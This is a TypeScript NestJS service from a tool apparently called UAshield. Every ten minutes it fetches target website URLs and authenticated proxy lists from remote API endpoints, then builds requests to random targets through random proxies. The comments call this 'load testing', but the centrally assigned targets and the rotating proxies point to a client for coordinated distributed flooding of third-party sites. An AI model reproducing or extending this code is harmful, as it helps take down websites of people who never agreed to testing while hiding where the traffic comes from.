import { AxiosProxyConfig } from 'axios';
import { lastValueFrom } from 'rxjs';
import { HttpService } from '@nestjs/axios';
import { ConsoleLogger, Injectable } from '@nestjs/common';
import { ConfigService } from '@nestjs/config';
import { Cron } from '@nestjs/schedule';
import { RandomService } from './random.service';
import { UashieldConfigInterface } from '../config';
import { ProxyInterface, SiteInterface } from '../interface';

@Injectable()
export class UashieldService {
  /**
   * The service logger.
   */
  protected logger = new ConsoleLogger(this.constructor.name);

  /**
   * API configuration.
   */
  protected config: UashieldConfigInterface;

  /**
   * List of URLs that needs to be load tested.
   * @see UashieldService.fetchUrls()
   */
  urls = new Set<string>();

  /**
   * List of proxies needs to be used for load testing.
   * @see UashieldService.fetchProxies()
   */
  axiosProxies: Array<AxiosProxyConfig> = [];

  /**
   * Service constructor.
   */
  constructor(
    protected readonly axios: HttpService,
    protected readonly configService: ConfigService,
    protected readonly randomService: RandomService,
  ) {
    this.config = this.configService.get<UashieldConfigInterface>('apis.uashield');
  }

  /**
   * Fetches everything from an API.
   */
  async fetchAll(): Promise<void> {
    await Promise.all([this.fetchProxies(), this.fetchUrls()]);
  }

  /**
   * Fetches from API all the current targets that needs to be load tested.
   *
   * Note: method will be invoked each 10 minutes.
   */
  @Cron('0 */10 * * * *')
  protected async fetchUrls() {
    // Retrieve list of hosts from API.
    const { data: hostsList } = await lastValueFrom(
      this.axios.get<Array<SiteInterface>>(this.config.endpoints.urls, this.config.axios),
    );
    this.urls = new Set(hostsList.map((v) => v.page));
    this.logger.debug(`Fetched ${this.urls.size} URLs from ${this.config.endpoints.urls}`);
  }

  /**
   * Fetches from API all the proxies that needs to be load tested.
   *
   * Note: method will be invoked each 10 minutes.
   */
  @Cron('0 */10 * * * *')
  protected async fetchProxies() {
    const { data } = await lastValueFrom(
      this.axios.get<Array<ProxyInterface>>(this.config.endpoints.proxy, this.config.axios),
    );
    // Transform response object to axios-compatible object.
    this.axiosProxies = data.map((proxy) => {
      const [username, password] = proxy.auth?.split(':', 2) ?? [];
      const [host, port] = proxy.ip.split(':', 2);
      const axiosProxy: AxiosProxyConfig = {
        host,
        port: port ? parseInt(port) : 443,
      };
      if (username && password) {
        axiosProxy.auth = { username, password };
      }
      return axiosProxy;
    });
    this.logger.debug(`Fetched ${this.axiosProxies.length} proxies from ${this.config.endpoints.proxy}`);
  }

  /**
   * Returns axios request object to random url with random proxy.
   */
  requestRandom() {
    return this.randomService.buildRandomRequest(this.urls, this.axiosProxies, this.config.axios);
  }
}
